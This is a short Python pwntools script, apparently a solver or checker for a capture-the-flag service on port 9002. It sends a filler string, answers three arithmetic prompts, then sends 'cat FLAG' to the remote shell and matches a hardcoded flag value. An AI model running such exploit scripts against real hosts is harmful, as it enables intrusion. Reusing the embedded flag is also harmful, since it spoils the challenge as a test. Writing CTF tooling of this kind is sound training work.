from pwn import *
import sys


def pwn_only_once(host):
    try:
        io = remote(host, 9002, timeout=3)
    except Exception:
        return 2

    r = io.recvuntil(b" = ", timeout=3)
    io.sendline(b"AAAAAAAA")
    cnt = 0

    while True:
        r = io.recvuntil(b" + ", timeout=3)
        a = int(r[-6:-3].decode())
        r = io.recvuntil(b" = ", timeout=3)
        b = int(r[0:3].decode())
        io.sendline(str(a + b).encode())
        r = io.recvline(timeout=3)
        if r == b"Cool!\n":
            cnt += 1
        if cnt >= 3:
            break

    io.sendline(b"cat FLAG")
    r = io.recvuntil(b"}", timeout=3)
    if b"FLAG{y0u_4r3_600d_47_c41cu14710n5!}" in r:
        return 0
    else:
        return 1


if __name__ == "__main__":
    if pwn_only_once(sys.argv[1]) != 0:
        exit(1)
